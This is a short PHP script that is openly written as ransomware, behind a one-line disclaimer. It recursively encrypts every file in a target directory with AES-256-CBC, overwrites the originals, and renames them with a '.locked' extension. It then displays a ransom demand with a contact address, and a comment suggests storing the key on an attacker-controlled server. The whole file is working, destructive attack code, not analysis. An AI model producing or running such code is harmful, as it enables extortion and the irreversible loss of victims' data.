<?php
// WARNING: This code is for informational purposes only. I strongly advise against using or distributing ransomware.

// Define the target directory to encrypt files (change it to your desired target)
$targetDirectory = '/path/to/target/directory';

// Generate a unique encryption key
$key = random_bytes(32);

// Encrypt files in the target directory
$files = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($targetDirectory),
    RecursiveIteratorIterator::LEAVES_ONLY
);

foreach ($files as $file) {
    if (!$file->isDir()) {
        $encryptedContent = openssl_encrypt(file_get_contents($file), 'AES-256-CBC', $key, OPENSSL_RAW_DATA);
        file_put_contents($file, $encryptedContent);

        // Append the ".locked" extension to the encrypted files
        rename($file, $file . '.locked');
    }
}

// Display the ransom message to the victim
$message = 'Your files have been encrypted. To decrypt them, you must pay a ransom. Contact us at hacker@example.com for further instructions.';
echo $message;

// Store the encryption key securely (e.g., in a remote server controlled by the attacker)
file_put_contents('encryption_key.txt', $key);
?>
